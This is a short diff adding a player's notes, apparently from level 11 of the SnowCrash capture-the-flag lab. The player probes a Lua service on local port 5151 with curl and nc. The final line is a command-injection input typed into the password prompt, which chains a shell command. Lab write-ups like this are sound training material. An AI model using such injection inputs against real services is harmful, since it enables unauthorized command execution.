@@ -1,0 +1,14 @@
+lua!
+
+so it has a server open at 5151
+
+curl 127.0.0.1:5151
+Password: Erf nope..
+
+
+ nc 127.0.0.1 5151
+Pssword: asdf
+Erf nope..
+
+level11@SnowCrash:~$ nc 127.0.0.1 5151
+Password: ;getflag > /tmp/bla; echo bla
